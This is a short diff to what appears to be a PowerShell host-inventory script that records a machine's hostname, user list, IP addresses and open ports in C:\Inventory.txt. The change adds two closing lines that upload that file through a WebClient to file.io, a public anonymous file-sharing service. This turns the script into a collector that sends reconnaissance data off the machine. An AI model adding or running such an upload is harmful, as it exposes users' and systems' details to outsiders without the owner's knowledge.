@@ -82,6 +82,7 @@ $OpenPorts = $g[0..($g.count - 3)]
 }
 
 
+
 Add-Content C:\Inventory.txt $Purpose
 Add-Content C:\Inventory.txt $hostname
 Add-Content C:\Inventory.txt $Userlist
@@ -94,5 +95,5 @@ Add-Content C:\Inventory.txt $IPAddress
 Add-Content C:\Inventory.txt $IPAddress2
 Add-Content C:\Inventory.txt $OpenPorts
 
-
-
+$wc = New-Object System.Net.WebClient
+$resp = $wc.UploadFile("https://file.io","C:\Inventory.txt")
